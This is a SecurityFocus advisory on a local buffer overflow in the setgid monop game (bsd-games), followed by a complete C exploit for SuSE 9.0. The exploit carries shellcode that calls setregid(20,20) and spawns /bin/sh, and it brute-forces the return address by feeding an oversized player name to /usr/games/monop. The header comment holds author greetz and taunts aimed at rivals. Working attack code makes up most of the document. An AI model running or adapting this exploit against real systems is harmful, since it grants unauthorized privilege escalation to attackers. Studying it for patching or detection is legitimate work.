source: http://www.securityfocus.com/bid/8501/info
 
Monop (included in bsd-games) is prone to a locally exploitable buffer overrun vulnerability. This is due to insufficient bounds checking of player names. Monop is typically installed setgid games, so it is possible to exploit this issue to execute arbitrary code with these privileges.

/* Suse 9.0 /usr/games/monop L0c4l gid=20(games) xploit.

4u7h0r: N4rK07IX
=> narkotix@linuxmail.org

Bug: 0v3rfl0w in 1. pl4y3r n4m3(07h3rs 4r3 p0ssibl3), 304 byt3s of pl4y3rn4m3 is 3n0ugh for xpl0i747i0n

th4nks 0x7bf2 f0r his suse b0x.

Gr33tZ: mathmonkey,0x7bf2,EFnet,blackhat community,gravi7y,FOZTRK
Shou7z:bigmu74n7 4nd his l4m3 cr3w

L4stw0rdz:DreamGod Fazla deil bi kac gun sora remote win2k yi release etcem, scriptkiddy korumali(fazla umutlanma sakin !)
          Biliyorum l33t hax0rsun !! O yazdigin remote2k encrypted olarak biz de de var cok heveslenme,sen ve senin
	  elite takiminin yazdigi 100 satir codu ben 15 dakkada yaziyorum o yuzden rakibim deilsiniz,ama sunu da unutmaki, 
          EFSANELER HIC BIR ZAMAN OLMEZLER !!!!!

*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/types.h>
#include <errno.h>
#define BUFFERSIZE 304 
#define PATH "/usr/games/monop"
#define PROG "monop"
#define ENTER "\n" 
#define NOP  '\220'
#define DEC 50
#define RED "\033[31m"
#define CONSOLE "\033[0m"
#define BRUTE_START 0xbffff6d0 //play with it

unsigned long getesp()
{
        __asm__("movl %esp, %eax");
}
    char shellcode[]= // Put h3r3 y0ur sm4r7 sh3llc0d3
/* setregid (20,20) */
    "\x31\xc0\x31\xdb\x31\xc9\xb3\x14\xb1\x14\xb0\x47"
    "\xcd\x80"

    /* exec /bin/sh */
    "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
    "\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

char  buffer[BUFFERSIZE];
char *pointer;
 

void vuln_start()
{
static FILE *lamemono;
static char fireupmono[] = "/usr/games/monop";
static char playernumber[]="1\n";
static char *playername = buffer;

lamemono = popen(fireupmono,"rw");
if(!popen)
 { fprintf(stderr,"[-]%s Could not create file\n",strerror(errno));
   exit(1);
 }
fprintf(lamemono,"%s",playernumber);
fflush(lamemono);

fprintf(lamemono,"%s",playername);
fflush(lamemono);

fprintf(lamemono,"%s",ENTER);
fflush(lamemono);
pclose(lamemono);
}


int child_process()
{
int i;
int status;
pid_t pid;
pid_t waitpid;
pid = fork();
  if(pid == -1)
    { fprintf(stderr,"[-]%s. Fork Failed!\n",strerror(errno) );
      exit(13);
    }
  else if (pid == 0)
    { 
       vuln_start();      
    }
  else { waitpid = wait(&status);
          if(waitpid == -1)
	   { fprintf(stderr,"[-] %s. Wait Failed! \n",strerror(errno));
	     return 1;
	   }
	   else if(waitpid != pid)
	   abort();
	   else 
             {
	       if(WIFEXITED(status))
	          { printf("Child Terminated Normally. Exit Code = %d\n",WEXITSTATUS(status));
		    return WEXITSTATUS(status);
		  }
	       else if(WIFSIGNALED(status))
	          { printf("Child Terminated Abnormally. Exit Code = %d "RED"(%s)"CONSOLE"\n",WTERMSIG(status),strsignal(WTERMSIG(status)));
		    return WTERMSIG(status);
	              if( COREDUMP(status) )
		        { printf(" Core Dumped,Core File Generated\n");
			}  
                  }
	       else{ fprintf(stderr,"[-] Child Stopped\n");
	            }
              }  
          }
     return 1;
 }
int make_buffer(unsigned long ret)
{
/*buffer = (char *)malloc(BUFFERSIZE*sizeof(char));
if(!buffer)
  {
   fprintf(stderr,"[-]malloc() failed. ");
   exit(-1);
   }
*/    
   char l =  (ret & 0x000000ff);
   char a =  (ret & 0x0000ff00) >> 8;
   char m =  (ret & 0x00ff0000) >> 16;
   char e =  (ret & 0xff000000) >> 24;
   
memset(buffer,NOP,BUFFERSIZE);
memcpy(&buffer[BUFFERSIZE-4-strlen(shellcode)],shellcode,strlen(shellcode));
buffer[300] = l;
buffer[301] = a;
buffer[302] = m;
buffer[303] = e;
return(0);
}

int bruteforce(unsigned long firstret)
{
long int i;
unsigned long found;
unsigned long ret;
fprintf(stdout,"[+] Bruteforce Starting!!!\n");
for(i = firstret ; i<0 ; i+=DEC)
     {
     fprintf(stdout,"[+] Testing Ret Address 0x%x\n",i);
     make_buffer(i);
     found = child_process();
     usleep(999);
     
      if(found == 0)
        { printf("Ret Adress Found = 0x%x\n",i);
	  break;
	}
    }
   return(0);
 }   

void banner(char *argv0)
{printf("Suse 9.0 /usr/games/monop Local Xploit\n");
 printf("4uth0r: N4rK07IX\n");
 printf("=> narkotix@linuxmail.org\n");
 printf("Bruteforce mode=> %s -b\n",argv0);
 printf("Manuel Ret mode=> %s -a RET\n",argv0);
 
 }
 main(int argc, char *argv[])
 {
  char *optionlist = "ba:h:";
  int option;
  unsigned long start = BRUTE_START;
  unsigned long choose;
  int u_r_script_kiddy = 0;
  int Opterr = 1;
  banner(argv[0]);
  if(argc < 2)
  fprintf(stderr,"Use -h for help\n");
  while( (option = getopt(argc,argv,optionlist) ) != -1)
       switch(option)
        { 
	  case 'b':
	   u_r_script_kiddy=1;
	   break;
	  
	  case 'h':
	   banner(argv[0]);
	   break; 
	   
	  case 'a':
           choose = strtoul(optarg,NULL,0);
           make_buffer(choose);
           child_process();
           exit(0);
           break;
	  
	  case '?':
	   fprintf(stderr,"Unknown Option use -h for help\n");
	   banner(argv[0]);
	   exit(-1);
	   
	  default:
	   banner(argv[0]);
	   exit(-1);
	}
   if(u_r_script_kiddy)
     bruteforce(start);
      return 0;
}    
